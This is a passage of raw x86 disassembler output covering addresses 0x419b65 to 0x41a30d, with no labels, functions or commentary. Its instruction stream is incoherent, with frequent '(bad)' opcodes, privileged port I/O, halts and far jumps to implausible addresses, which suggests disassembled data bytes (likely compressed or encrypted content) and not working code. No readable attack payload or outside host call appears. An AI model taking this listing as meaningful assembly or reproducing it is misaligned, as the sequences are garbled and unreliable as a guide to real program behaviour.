  419b65:	fmul   QWORD PTR [ebp+0x20c43c0e]
  419b6b:	push   ecx
  419b6c:	bound  ecx,QWORD PTR [esi]
  419b6e:	xlat   BYTE PTR ds:[ebx]
  419b6f:	pop    ebx
  419b70:	out    dx,al
  419b71:	push   ebx
  419b72:	fucom  st(7)
  419b74:	mov    ebx,0x501d0833
  419b79:	iret   
  419b7a:	div    dl
  419b7c:	mov    edx,0xeefcf73e
  419b81:	loopne 0x419b92
  419b83:	out    0xbc,eax
  419b85:	or     al,0x40
  419b87:	mov    ch,0xcf
  419b89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b8a:	mov    eax,0x1ff9eb46
  419b8f:	data16 hlt 
  419b91:	mov    DWORD PTR [edi+0x14fe5066],ebx
  419b97:	mov    cl,0x44
  419b99:	xchg   esi,eax
  419b9a:	bound  edi,QWORD PTR [edx]
  419b9c:	(bad)  
  419b9d:	push   0xc374430
  419ba2:	push   ss
  419ba3:	mov    ecx,DWORD PTR [ebx-0x8]
  419ba6:	adc    eax,0x93aeba3f
  419bab:	dec    esp
  419bac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bad:	xor    BYTE PTR [ebp+0x3],cl
  419bb0:	pop    ecx
  419bb1:	div    BYTE PTR [ecx+0x71]
  419bb4:	push   ecx
  419bb5:	dec    ebp
  419bb6:	out    0x73,al
  419bb8:	stc    
  419bb9:	jg     0x419bac
  419bbb:	mov    ebx,0x2fb7f2ff
  419bc0:	(bad)  
  419bc2:	aad    0xfe
  419bc4:	ficom  WORD PTR [ecx+0x5be014eb]
  419bca:	adc    al,0xd3
  419bcc:	mov    dl,0x9e
  419bce:	cmovbe esp,DWORD PTR [edx+0x40204acb]
  419bd5:	stos   DWORD PTR es:[edi],eax
  419bd6:	push   ecx
  419bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bd8:	fucomi st,st(1)
  419bda:	mov    al,ds:0x4a952aa9
  419bdf:	test   DWORD PTR [edx+ebp*1+0x4b],esi
  419be3:	mov    ebx,0x6ed9a6d3
  419be8:	adc    cl,BYTE PTR [edi+eax*4]
  419beb:	shl    DWORD PTR [ebp-0x7d1095d7],1
  419bf1:	mov    bl,0x63
  419bf3:	fdivr  DWORD PTR [eax+0xd3917f3]
  419bf9:	mov    ebp,0xebdad39f
  419bfe:	fdiv   QWORD PTR [esi]
  419c00:	pop    ds
  419c01:	adc    ch,BYTE PTR [ebp+0xf2e117c]
  419c07:	mov    al,0x26
  419c09:	and    BYTE PTR [edx],ch
  419c0b:	and    BYTE PTR [edx+0xa79e27c],bh
  419c11:	loopne 0x419c23
  419c13:	mov    BYTE PTR [edx+ebp*8-0x30504c7f],bl
  419c1a:	repnz add BYTE PTR [ebx-0x72],dh
  419c1e:	out    0x37,eax
  419c20:	popf   
  419c21:	xor    bh,bl
  419c23:	repz jp 0x419bf1
  419c26:	repz ja 0x419c40
  419c29:	(bad)  
  419c2a:	out    0xab,eax
  419c2c:	or     eax,0x4053b38c
  419c31:	hlt    
  419c32:	lock or BYTE PTR [ebx+esi*2],ch
  419c36:	mov    ?,WORD PTR [edi]
  419c38:	js     0x419bd1
  419c3a:	cmp    BYTE PTR [eax],0x40
  419c3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c3e:	lock adc al,0x46
  419c41:	jo     0x419ca8
  419c43:	sub    al,0xb8
  419c45:	xor    DWORD PTR [ecx],0x3c
  419c48:	push   ebp
  419c49:	mov    eax,ds:0xb2839870
  419c4e:	xor    al,0x9f
  419c50:	outs   dx,DWORD PTR ds:[esi]
  419c51:	add    BYTE PTR [eax],ah
  419c53:	sbb    al,al
  419c55:	js     0x419c3d
  419c57:	std    
  419c58:	(bad)  
  419c59:	dec    edx
  419c5a:	or     BYTE PTR [ebx-0x183b922c],0x7f
  419c61:	add    al,0xa3
  419c63:	hlt    
  419c64:	inc    ecx
  419c65:	(bad)  
  419c67:	ds and eax,0xeb709f59
  419c6d:	inc    esi
  419c6e:	mov    BYTE PTR [edx-0x56ad5826],bh
  419c74:	adc    BYTE PTR [esi-0x2523267c],cl
  419c7a:	mov    ds:0xefd2eddb,al
  419c7f:	imul   DWORD PTR [ecx]
  419c81:	das    
  419c82:	scas   eax,DWORD PTR es:[edi]
  419c83:	push   eax
  419c84:	lods   eax,DWORD PTR ds:[esi]
  419c85:	pushf  
  419c86:	loope  0x419cdf
  419c88:	adc    al,0x4c
  419c8a:	ret    
  419c8b:	pusha  
  419c8c:	xor    bl,BYTE PTR [esi-0x2e3c7808]
  419c92:	mov    DWORD PTR [eax+0x3723bfd7],0xb9419fc1
  419c9c:	ss add bh,bl
  419c9f:	mov    ds:0x1ffdfb74,al
  419ca4:	mov    WORD PTR [ebp+0x63],es
  419ca7:	add    al,0xe2
  419ca9:	xor    DWORD PTR [edx-0x33],ebx
  419cac:	push   es
  419cad:	and    BYTE PTR [eax],0x10
  419cb0:	pop    edi
  419cb2:	sbb    BYTE PTR ds:0x43868c47,cl
  419cb8:	xor    ch,cl
  419cba:	xor    al,0x67
  419cbc:	xchg   ebp,eax
  419cbd:	xor    edi,DWORD PTR [edx+0x72a50e9d]
  419cc3:	cdq    
  419cc4:	shl    DWORD PTR [eax-0x78],1
  419cc7:	gs call 0x9b681a11
  419ccd:	retf   
  419cce:	gs mov edx,0xe17a05d9
  419cd4:	mov    edi,0x60ef58c0
  419cd9:	push   ebp
  419cda:	inc    BYTE PTR [ebp+eax*4-0x624bbc02]
  419ce1:	ffreep st(3)
  419ce3:	fistp  QWORD PTR [esi]
  419ce5:	inc    eax
  419ce6:	xor    DWORD PTR [esp+esi*1+0x15],ecx
  419cea:	lock loope 0x419d3b
  419ced:	add    al,0x12
  419cef:	inc    ebp
  419cf0:	mov    ebx,0x3228ef66
  419cf5:	mov    bl,0xc8
  419cf7:	inc    ecx
  419cf8:	fs into 
  419cfa:	adc    eax,0xd8eb22f0
  419cff:	pusha  
  419d00:	mov    ds:0x857c3697,al
  419d05:	lahf   
  419d06:	outs   dx,DWORD PTR ds:[esi]
  419d07:	(bad)  
  419d08:	out    dx,al
  419d09:	cld    
  419d0a:	shr    ebp,1
  419d0c:	push   cs
  419d0d:	je     0x419ca7
  419d0f:	jg     0x419caf
  419d11:	jmp    0x1f2d:0xdb15cc04
  419d18:	cmp    ch,ah
  419d1a:	ds pop es
  419d1c:	mov    ah,0x84
  419d1e:	jns    0x419d09
  419d20:	into   
  419d21:	sub    DWORD PTR [edi],esi
  419d23:	cmp    al,BYTE PTR [esi]
  419d25:	enter  0x2783,0x0
  419d29:	repz pop ecx
  419d2b:	and    DWORD PTR [esi],0xeaa816c8
  419d31:	lods   al,BYTE PTR ds:[esi]
  419d32:	mov    esp,0x987326a9
  419d37:	ja     0x419d98
  419d39:	in     eax,0x3c
  419d3b:	jl     0x419cd8
  419d3d:	aaa    
  419d3e:	jnp    0x419d49
  419d40:	or     BYTE PTR [ebx],0x37
  419d43:	fcomp  st(0)
  419d45:	fsub   st,st(2)
  419d47:	(bad)  
  419d48:	imul   edi,DWORD PTR [edi-0x3e],0xffffffb4
  419d4c:	jge    0x419d0f
  419d4e:	cwde   
  419d4f:	adc    al,0xdd
  419d51:	dec    esi
  419d52:	fwait
  419d53:	std    
  419d54:	mov    ebp,0x1fdfa5d
  419d59:	das    
  419d5a:	jg     0x419d3c
  419d5c:	add    esi,DWORD PTR [edx+edi*1+0x1d]
  419d60:	mov    dh,0x1f
  419d62:	aas    
  419d63:	bound  esp,QWORD PTR [ebx-0xd]
  419d66:	push   es
  419d67:	xchg   BYTE PTR [ecx-0x318e8e8d],ah
  419d6d:	loop   0x419dc1
  419d6f:	mov    DWORD PTR [esi-0x59],ecx
  419d72:	dec    ebp
  419d73:	xor    BYTE PTR [esp+eiz*2],dl
  419d76:	cmp    al,0x9e
  419d78:	cld    
  419d79:	adc    al,dh
  419d7b:	neg    edi
  419d7d:	fldcw  WORD PTR [ebx-0x51a89801]
  419d83:	push   ebx
  419d84:	sub    BYTE PTR [edi+0x41],0xfe
  419d88:	into   
  419d89:	(bad)  
  419d8b:	gs pop edi
  419d8d:	mov    bl,0xd9
  419d8f:	cli    
  419d90:	lds    edi,FWORD PTR [eax+0x3c]
  419d93:	mov    cl,0x10
  419d95:	or     al,0x86
  419d97:	adc    BYTE PTR [ebp-0x6f],al
  419d9a:	ins    BYTE PTR es:[edi],dx
  419d9b:	cs inc edi
  419d9d:	ss xchg edi,eax
  419d9f:	popa   
  419da0:	cmp    bl,BYTE PTR [esi+0x29e7cb90]
  419da6:	cs sub al,0xa2
  419da9:	test   eax,0x10c18253
  419dae:	fstp   DWORD PTR [esi+ecx*4+0x48]
  419db2:	and    al,0x4a
  419db4:	es fwait
  419db6:	gs xor al,0x1e
  419db9:	mov    ds:0x48d11a6b,al
  419dbe:	and    BYTE PTR [eax+edi*1-0x38],0xa3
  419dc3:	in     eax,dx
  419dc4:	cmp    eax,0x8411074e
  419dc9:	sbb    ebx,DWORD PTR [edi-0x3019833d]
  419dcf:	jae    0x419d71
  419dd1:	ins    BYTE PTR es:[edi],dx
  419dd2:	ror    DWORD PTR [ebp-0x1931efd2],1
  419dd8:	or     al,cl
  419dda:	sbb    dh,BYTE PTR [edx+0x1a984631]
  419de0:	pop    eax
  419de1:	stos   BYTE PTR es:[edi],al
  419de2:	cmp    eax,0xd021df27
  419de7:	js     0x419e26
  419de9:	in     eax,dx
  419dea:	je     0x419d72
  419dec:	pushf  
  419ded:	mov    ebx,0x2b987593
  419df2:	scas   eax,DWORD PTR es:[edi]
  419df3:	fucomi st,st(2)
  419df5:	retf   
  419df6:	sbb    al,0x81
  419df8:	mov    bh,0x84
  419dfa:	jns    0x419d90
  419dfc:	loopne 0x419e2b
  419dfe:	or     edi,DWORD PTR [edx-0x76f0e05c]
  419e04:	(bad)  
  419e05:	stos   DWORD PTR es:[edi],eax
  419e06:	loopne 0x419de6
  419e08:	enter  0x4dc0,0x1
  419e0c:	sahf   
  419e0d:	or     bh,cl
  419e0f:	popa   
  419e10:	jle    0x419e3e
  419e12:	out    dx,eax
  419e13:	icebp  
  419e14:	add    al,0x1b
  419e16:	icebp  
  419e17:	pop    ss
  419e18:	push   esp
  419e19:	adc    BYTE PTR [eax+edx*1+0x70],ch
  419e1d:	sub    al,0x87
  419e1f:	cmp    BYTE PTR [edi+0x56],dl
  419e22:	cwde   
  419e23:	cmp    al,0xf3
  419e25:	and    ecx,DWORD PTR [edi+edi*1-0x6643ac04]
  419e2c:	stc    
  419e2d:	and    DWORD PTR [esi],eax
  419e2f:	pop    ebx
  419e30:	call   DWORD PTR [ecx]
  419e32:	adc    ebp,0x16cc910f
  419e38:	pop    ecx
  419e39:	dec    eax
  419e3a:	(bad)  
  419e3b:	or     edx,edi
  419e3d:	inc    esp
  419e3e:	sub    ah,BYTE PTR [edi+0x27]
  419e41:	pop    eax
  419e42:	add    bl,ah
  419e44:	mov    esp,0xa74e9b79
  419e49:	ret    
  419e4a:	jmp    0x6102a828
  419e4f:	adc    BYTE PTR [ebp+0x51],al
  419e52:	cmp    BYTE PTR [ecx],bh
  419e54:	cmp    DWORD PTR [ecx-0x30],esp
  419e57:	out    dx,eax
  419e58:	adc    DWORD PTR [edx],ecx
  419e5a:	xchg   DWORD PTR [eax+0x3a746bd7],ebp
  419e60:	sbb    eax,0x9d30a142
  419e65:	outs   dx,BYTE PTR ds:[esi]
  419e66:	fwait
  419e67:	push   0x14304a34
  419e6c:	mov    ?,WORD PTR [edi-0x4]
  419e6f:	xchg   ebx,eax
  419e70:	lahf   
  419e71:	cld    
  419e72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e73:	jg     0x419e65
  419e75:	jnp    0x419e76
  419e77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e78:	neg    DWORD PTR ds:0xccfe25bc
  419e7e:	enter  0x475,0xf0
  419e82:	sub    eax,0xf9f9d9c8
  419e87:	int    0x6e
  419e89:	mov    bh,0x7b
  419e8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e8c:	push   esp
  419e8d:	cs jae 0x419f09
  419e90:	jns    0x419e60
  419e92:	inc    edx
  419e93:	jno    0x419ea6
  419e95:	retf   
  419e96:	mov    dl,0x8
  419e98:	add    eax,0x6d6c6c02
  419e9d:	add    DWORD PTR [edx],eax
  419e9f:	call   0x1026:0x5a54b1a6
  419ea6:	or     al,0x50
  419ea8:	scas   eax,DWORD PTR es:[edi]
  419ea9:	aad    0xb0
  419eab:	dec    esp
  419eac:	xchg   ebx,eax
  419ead:	shl    dl,cl
  419eaf:	xor    bl,ch
  419eb1:	jbe    0x419e4e
  419eb3:	inc    edi
  419eb4:	(bad)  
  419eb5:	push   ds
  419eb6:	xchg   edx,eax
  419eb7:	dec    esi
  419eb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419eb9:	sub    DWORD PTR [edi+0x1609232c],ebp
  419ebf:	(bad)  
  419ec0:	mov    eax,0x976cfb45
  419ec5:	aad    0x97
  419ec7:	pop    esi
  419ec8:	sar    DWORD PTR [ebx+esi*8-0x60b90bfd],0x64
  419ed0:	nop
  419ed1:	dec    ebp
  419ed2:	mov    eax,ds:0x95c65d1a
  419ed7:	pop    es
  419ed8:	sub    al,0x48
  419eda:	push   ebp
  419edb:	test   al,0xbe
  419edd:	shl    eax,0xf0
  419ee0:	dec    edi
  419ee1:	or     DWORD PTR [ebx+0x21d37c15],ebp
  419ee7:	(bad)  
  419ee8:	aam    0x98
  419eea:	xchg   ebp,eax
  419eeb:	rol    BYTE PTR [eax+edx*8-0x3a],1
  419eef:	ss cdq 
  419ef1:	inc    esi
  419ef2:	call   0x9360:0x33826e03
  419ef9:	jns    0x419f24
  419efb:	rcl    BYTE PTR [ebp+0x74],1
  419efe:	iret   
  419eff:	arpl   WORD PTR [esi],cx
  419f01:	or     al,ch
  419f03:	lods   eax,DWORD PTR ds:[esi]
  419f04:	jmp    0x85d06d6c
  419f09:	out    0x71,eax
  419f0b:	aaa    
  419f0c:	(bad)  
  419f0d:	pop    ss
  419f0e:	mov    ebp,0x820db407
  419f13:	lods   eax,DWORD PTR ds:[esi]
  419f14:	loopne 0x419f18
  419f16:	xor    eax,DWORD PTR [eax-0x2e]
  419f19:	jns    0x419f77
  419f1b:	push   ss
  419f1c:	inc    ecx
  419f1d:	nop
  419f1e:	inc    ecx
  419f1f:	xor    eax,0xd0c50ac1
  419f24:	and    esp,DWORD PTR ds:0xc84d91c6
  419f2a:	cmp    eax,0xcb34e1cb
  419f2f:	or     DWORD PTR [ebx],0xffffff83
  419f32:	fcom   st(2)
  419f34:	sbb    eax,0x726e3656
  419f39:	mov    al,0xf7
  419f3b:	test   BYTE PTR [ebx-0x329de26d],dh
  419f41:	add    DWORD PTR [edi],ebx
  419f43:	cli    
  419f44:	call   0xb8a65090
  419f49:	mov    eax,0x8d122738
  419f4e:	jno    0x419f4b
  419f50:	cdq    
  419f51:	cmp    ecx,DWORD PTR [esi+eax*1]
  419f54:	inc    ebx
  419f55:	push   ss
  419f56:	mov    cl,BYTE PTR [ebx+0x4243c68c]
  419f5c:	rcl    DWORD PTR [eax],0xeb
  419f5f:	jmp    0x419efc
  419f61:	inc    esp
  419f62:	mov    ds:0xb83e1e11,al
  419f67:	dec    edi
  419f68:	sub    bl,BYTE PTR [ebp+0x71cd9726]
  419f6e:	push   ecx
  419f6f:	cmp    eax,0x52891227
  419f74:	pop    eax
  419f75:	pop    eax
  419f76:	mov    al,ds:0x8b11efdf
  419f7b:	lds    edx,FWORD PTR [eax+0x55]
  419f7e:	sub    eax,0x3f4e9d35
  419f83:	add    al,0xfc
  419f85:	mov    bl,0xef
  419f87:	fcomp  QWORD PTR ds:0xae4767f1
  419f8d:	or     eax,0x9920b7c0
  419f92:	ins    BYTE PTR es:[edi],dx
  419f93:	not    BYTE PTR [ebx-0xb]
  419f96:	pop    edx
  419f97:	dec    ebp
  419f98:	sbb    DWORD PTR ds:0x5d3b7407,ecx
  419f9e:	rcr    BYTE PTR [ecx-0x738736f4],cl
  419fa4:	ret    
  419fa5:	ret    
  419fa6:	inc    ebx
  419fa7:	mov    dh,0xb6
  419fa9:	outs   dx,BYTE PTR ds:[esi]
  419faa:	adc    BYTE PTR [edx],cl
  419fac:	xchg   DWORD PTR [eax],edi
  419fae:	fcomp  st(3)
  419fb0:	and    ebx,DWORD PTR [edx]
  419fb2:	lea    esi,[ecx-0x36364e42]
  419fb8:	shl    DWORD PTR [ecx],1
  419fba:	cmc    
  419fbb:	inc    esi
  419fbc:	sbb    eax,0x94501441
  419fc1:	add    BYTE PTR [edx-0x44a68ed8],ah
  419fc7:	and    al,0xbf
  419fc9:	mov    al,0xc0
  419fcb:	lea    ebx,[ebx-0x7e2226c9]
  419fd1:	push   0x3c74ce3c
  419fd6:	and    bl,BYTE PTR [ecx]
  419fd8:	icebp  
  419fd9:	xchg   ebx,eax
  419fda:	mov    WORD PTR [edx],gs
  419fdc:	test   BYTE PTR [ebx],ah
  419fde:	inc    ecx
  419fdf:	fidivr WORD PTR [eax+0x63]
  419fe2:	xchg   DWORD PTR [esi+0x3b],eax
  419fe5:	inc    eax
  419fe6:	addr16 in eax,0x53
  419fe9:	in     al,0x3f
  419feb:	clc    
  419fec:	lahf   
  419fed:	rcr    DWORD PTR [edx+0x3b],1
  419ff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ff1:	jae    0x419fac
  419ff3:	inc    edi
  419ff4:	cmp    DWORD PTR [ecx],esp
  419ff6:	mov    dl,0x14
  419ff8:	sbb    dh,BYTE PTR [edx]
  419ffa:	lods   eax,DWORD PTR ds:[esi]
  419ffb:	aas    
  419ffc:	rcl    edi,0x3d
  419fff:	inc    ebp
  41a000:	mov    esp,0xfe706538
  41a005:	add    BYTE PTR [ecx+0x3c],bh
  41a008:	ror    edi,0x4
  41a00b:	inc    ecx
  41a00c:	xor    eax,0x32b326b1
  41a011:	call   0xb4db:0xde380983
  41a018:	push   ecx
  41a019:	jbe    0x41a08a
  41a01b:	ja     0x419fbf
  41a01d:	xor    ebp,DWORD PTR [ecx+0x701df9d8]
  41a023:	inc    edi
  41a024:	mov    DWORD PTR [ebx-0x2c34f82b],edi
  41a02a:	jo     0x41a010
  41a02c:	adc    BYTE PTR [eax+0x35e5edb2],0x30
  41a033:	cld    
  41a034:	and    BYTE PTR [edx],ch
  41a036:	xor    DWORD PTR [edi+edi*2],ecx
  41a039:	add    dl,al
  41a03b:	retf   
  41a03c:	push   0x430712e1
  41a041:	xor    DWORD PTR [ebx+0x7d391471],0xfadc293
  41a04b:	rcl    ecx,cl
  41a04d:	add    bl,BYTE PTR [esi+edx*2]
  41a050:	sbb    ah,ah
  41a052:	adc    ecx,DWORD PTR [ebx+0x78e42e2c]
  41a058:	scas   al,BYTE PTR es:[edi]
  41a059:	fbld   TBYTE PTR [esi]
  41a05b:	sbb    al,0xf4
  41a05d:	adc    esi,eax
  41a05f:	mov    ebp,DWORD PTR [edi+esi*2-0x15]
  41a063:	mov    BYTE PTR [esi-0x1d6addb7],dl
  41a069:	mov    ds:0xe8e8e55a,al
  41a06e:	mov    BYTE PTR [edx-0x53],bl
  41a071:	(bad)  
  41a072:	retf   
  41a073:	das    
  41a074:	mov    edi,0xa09e3c4c
  41a079:	aad    0x6c
  41a07b:	jae    0x41a0f9
  41a07d:	jl     0x419fff
  41a07f:	loop   0x41a078
  41a081:	repz int3 
  41a083:	fnstsw WORD PTR [ebx-0xe7fb5d8]
  41a089:	js     0x41a0cf
  41a08b:	jno    0x41a036
  41a08d:	inc    esp
  41a08e:	xor    bl,BYTE PTR [ecx-0x6cf1ebe0]
  41a094:	into   
  41a095:	or     BYTE PTR fs:[ebx+eax*4],al
  41a099:	dec    eax
  41a09a:	mov    dl,0x44
  41a09c:	ss xchg edi,eax
  41a09e:	arpl   WORD PTR [edx+ebx*1],di
  41a0a1:	and    cl,BYTE PTR [edx-0x7366cde]
  41a0a7:	repz pop esp
  41a0a9:	sbb    eax,DWORD PTR [eax+0xdae496f]
  41a0af:	shl    BYTE PTR [edi-0x2ab25e0],0x6c
  41a0b6:	and    BYTE PTR [eax],bl
  41a0b8:	inc    edx
  41a0b9:	ror    DWORD PTR ds:0x7aa2cb2c,cl
  41a0bf:	push   esi
  41a0c0:	and    DWORD PTR [esi],ebx
  41a0c2:	or     DWORD PTR [ecx],esi
  41a0c4:	push   ds
  41a0c5:	(bad)  
  41a0c6:	cmp    DWORD PTR [ecx],edi
  41a0c8:	bound  esi,QWORD PTR ds:[ebp+0x75]
  41a0cc:	(bad)  
  41a0cd:	shr    DWORD PTR [eax+0x44],1
  41a0d0:	scas   eax,DWORD PTR es:[edi]
  41a0d1:	xlat   BYTE PTR ds:[ebx]
  41a0d2:	and    ebx,DWORD PTR [eax]
  41a0d4:	or     al,0xe2
  41a0d6:	repz int 0xd6
  41a0d9:	add    dl,bh
  41a0db:	cs cs mov eax,0x2c0bc2fb
  41a0e2:	test   eax,0x4bb5ea25
  41a0e7:	inc    esp
  41a0e8:	push   ecx
  41a0e9:	and    BYTE PTR [esp+ecx*1],dl
  41a0ec:	mov    cl,0xbc
  41a0ee:	mov    dl,0x46
  41a0f0:	cmp    dl,BYTE PTR [ebx+0x5068d1a1]
  41a0f6:	cmp    DWORD PTR ds:0xb0891225,edi
  41a0fc:	push   esp
  41a0fd:	and    ecx,DWORD PTR cs:[ecx]
  41a100:	push   ss
  41a101:	cmp    BYTE PTR [esi],0xa4
  41a104:	ja     0x41a17f
  41a106:	les    ebp,FWORD PTR [ebp-0x2a56dd4b]
  41a10c:	push   ebp
  41a10d:	fisubr DWORD PTR [ecx-0x798b76d4]
  41a113:	dec    edx
  41a114:	stos   DWORD PTR es:[edi],eax
  41a115:	retf   
  41a116:	fchs   
  41a118:	sbb    DWORD PTR [edx+0xf9930f9],esp
  41a11e:	inc    esi
  41a11f:	mov    ecx,0xf2e03d3c
  41a124:	loopne 0x41a157
  41a126:	or     ecx,DWORD PTR [ecx]
  41a128:	xor    ebp,0xb4df1c7c
  41a12e:	int    0xb0
  41a130:	jnp    0x41a17a
  41a132:	push   edx
  41a133:	xor    al,0x69
  41a135:	popf   
  41a136:	sahf   
  41a137:	xor    ch,dh
  41a139:	pushf  
  41a13a:	loop   0x41a153
  41a13c:	pop    es
  41a13d:	inc    esp
  41a13e:	adc    eax,0xc602108b
  41a143:	inc    esp
  41a144:	inc    ebp
  41a145:	adc    cl,BYTE PTR [esp+ebp*1+0x7d]
  41a149:	ret    0x3c78
  41a14c:	jo     0x41a1b5
  41a14e:	adc    eax,0xe0828a28
  41a153:	scas   al,BYTE PTR es:[edi]
  41a154:	xor    dl,dh
  41a156:	xor    ebx,DWORD PTR [esi+0xd4c4cea]
  41a15c:	shl    edi,cl
  41a15e:	daa    
  41a15f:	pushf  
  41a160:	pop    edi
  41a161:	and    al,0x18
  41a163:	xor    bl,BYTE PTR cs:[eax+0x393304c8]
  41a16a:	jp     0x41a1aa
  41a16c:	aas    
  41a16d:	sti    
  41a16e:	addr16 arpl dx,bx
  41a171:	shl    DWORD PTR [eax],cl
  41a173:	test   eax,0xad2c5bd5
  41a178:	mov    edi,0x90fab38f
  41a17d:	mov    eax,ds:0x942d9329
  41a182:	cdq    
  41a183:	push   0x6
  41a185:	push   0xfffffff5
  41a187:	pushf  
  41a188:	in     eax,0x8d
  41a18a:	push   ebp
  41a18b:	add    al,0x43
  41a18d:	gs out 0x8f,eax
  41a190:	(bad)  
  41a191:	sub    eax,0x85076efd
  41a196:	xor    DWORD PTR [edi-0x49e7e829],esi
  41a19c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a19d:	je     0x41a1da
  41a19f:	inc    ebx
  41a1a0:	push   es
  41a1a1:	xchg   edx,eax
  41a1a2:	dec    esp
  41a1a3:	jno    0x41a20e
  41a1a5:	mov    DWORD PTR [edx+ebp*1-0x33],esp
  41a1a9:	cli    
  41a1aa:	mov    BYTE PTR [esi],0x8d
  41a1ad:	inc    esi
  41a1ae:	popf   
  41a1af:	mov    ds:0x67e7df89,ax
  41a1b5:	xor    bl,BYTE PTR [ecx-0x34444850]
  41a1bb:	div    dh
  41a1bd:	arpl   dx,sp
  41a1bf:	icebp  
  41a1c0:	add    al,0x2f
  41a1c2:	mov    ebp,0xe7aa01f4
  41a1c7:	push   ebp
  41a1c8:	sub    ah,BYTE PTR [edi-0x5]
  41a1cb:	in     al,0xb
  41a1cd:	or     ebp,DWORD PTR [esi+ebp*2+0x6d]
  41a1d1:	jno    0x41a224
  41a1d3:	lods   eax,DWORD PTR ds:[esi]
  41a1d4:	shr    BYTE PTR [esi+esi*1+0x59],cl
  41a1d8:	sub    dl,BYTE PTR [ebp+0xc9ab568]
  41a1de:	cli    
  41a1df:	jge    0x41a1f3
  41a1e1:	leave  
  41a1e2:	and    al,0x95
  41a1e4:	dec    edx
  41a1e5:	add    eax,0xf4199659
  41a1ea:	pop    es
  41a1eb:	scas   eax,DWORD PTR es:[edi]
  41a1ec:	(bad)  
  41a1ed:	rcr    bh,cl
  41a1ef:	jmp    ebp
  41a1f1:	fmul   DWORD PTR [edi-0x1]
  41a1f4:	in     al,0x5f
  41a1f6:	mov    esi,0x89be034e
  41a1fb:	pop    esp
  41a1fc:	sbb    eax,DWORD PTR [eax-0x1c80dd91]
  41a202:	out    0xfe,eax
  41a204:	push   esi
  41a205:	test   eax,0x94be6cd9
  41a20a:	dec    esp
  41a20b:	(bad)  
  41a20c:	leave  
  41a20d:	in     eax,0x72
  41a20f:	mov    BYTE PTR [edx+0x40deb340],ah
  41a215:	xchg   esp,eax
  41a216:	fs (bad) 
  41a219:	sbb    ch,ch
  41a21b:	dec    esi
  41a21c:	xchg   edi,eax
  41a21d:	loop   0x41a293
  41a21f:	dec    edx
  41a220:	ss fwait
  41a222:	in     eax,0xe4
  41a224:	in     al,0x84
  41a226:	leave  
  41a227:	je     0x41a1eb
  41a229:	jmp    0xa23:0xa1ba1ada
  41a230:	add    ah,BYTE PTR [edx]
  41a232:	add    bh,cl
  41a234:	jl     0x41a1d4
  41a236:	pop    esp
  41a237:	xchg   DWORD PTR ss:[ebx+ecx*4],esp
  41a23b:	sbb    al,0x1d
  41a23d:	pop    ds
  41a23e:	xor    bl,BYTE PTR [ebp+0x62c5884c]
  41a244:	sbb    BYTE PTR [esi-0x5b2244bf],al
  41a24a:	xlat   BYTE PTR ds:[ebx]
  41a24b:	in     eax,dx
  41a24c:	nop
  41a24d:	dec    edx
  41a24e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a24f:	fcomp  st(4)
  41a251:	mov    esp,0x84482081
  41a256:	ret    0x621
  41a259:	std    
  41a25a:	add    DWORD PTR [esi+0x11a18165],edx
  41a260:	or     ecx,DWORD PTR [edx-0x64]
  41a263:	imul   DWORD PTR [ebx+0xc]
  41a266:	jmp    0xcf12:0x742e7447
  41a26d:	mov    ebp,0xbdcfbb8f
  41a272:	int3   
  41a273:	jno    0x41a227
  41a275:	dec    eax
  41a276:	es mov bh,0xc0
  41a279:	jo     0x41a2ad
  41a27b:	in     eax,0xc9
  41a27d:	into   
  41a27e:	add    ebp,DWORD PTR cs:[esi-0x4e]
  41a282:	mov    ecx,0x7dfc4ebe
  41a287:	xor    DWORD PTR [esi],ecx
  41a289:	div    DWORD PTR [edi-0x3f]
  41a28c:	xor    bl,BYTE PTR [ecx+0x2e]
  41a28f:	adc    eax,0x470289f1
  41a294:	inc    edi
  41a295:	xchg   DWORD PTR [ebx+ecx*1],edx
  41a298:	pop    ecx
  41a299:	inc    edx
  41a29a:	add    DWORD PTR [edi],edi
  41a29c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a29d:	daa    
  41a29e:	(bad)  
  41a29f:	xor    al,0xeb
  41a2a1:	xchg   edi,eax
  41a2a2:	adc    al,0x16
  41a2a4:	mov    ch,BYTE PTR [ebp*1-0x4a932dd3]
  41a2ab:	cdq    
  41a2ac:	dec    esi
  41a2ad:	jne    0x41a2c5
  41a2af:	xchg   edi,eax
  41a2b0:	xchg   esi,eax
  41a2b1:	push   0xef6c0677
  41a2b6:	push   ds
  41a2b7:	adc    BYTE PTR [edi-0x5a],cl
  41a2ba:	pop    eax
  41a2bb:	pop    ebp
  41a2bc:	pop    ebx
  41a2bd:	arpl   WORD PTR [eax],di
  41a2bf:	call   0x9b26:0x4a747070
  41a2c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2c7:	pop    eax
  41a2c8:	pop    eax
  41a2c9:	and    al,0xbc
  41a2cb:	ss pusha 
  41a2cd:	shr    BYTE PTR [eax+esi*4-0x4c],cl
  41a2d1:	mov    cl,0xc1
  41a2d3:	jns    0x41a2ba
  41a2d5:	cwde   
  41a2d6:	pop    es
  41a2d7:	cmp    ecx,DWORD PTR [edi-0xed64b2f]
  41a2dd:	dec    eax
  41a2de:	cwde   
  41a2df:	int    0x8d
  41a2e1:	dec    ebp
  41a2e2:	inc    edx
  41a2e3:	loop   0x41a279
  41a2e5:	pop    eax
  41a2e6:	inc    eax
  41a2e7:	mov    al,ds:0xf8a29bdf
  41a2ec:	std    
  41a2ed:	adc    BYTE PTR [ebp+0x702fc851],cl
  41a2f3:	jl     0x41a369
  41a2f5:	(bad)  
  41a2f6:	out    dx,al
  41a2f7:	into   
  41a2f8:	adc    eax,DWORD PTR [esi]
  41a2fa:	std    
  41a2fb:	ds iret 
  41a2fd:	mov    ebp,0x363645ef
  41a302:	ss mov ecx,0xd0c4bcbc
  41a308:	addr16 mov ds:0x728d,eax
  41a30c:	stc    
  41a30d:	sub    al,0xf1
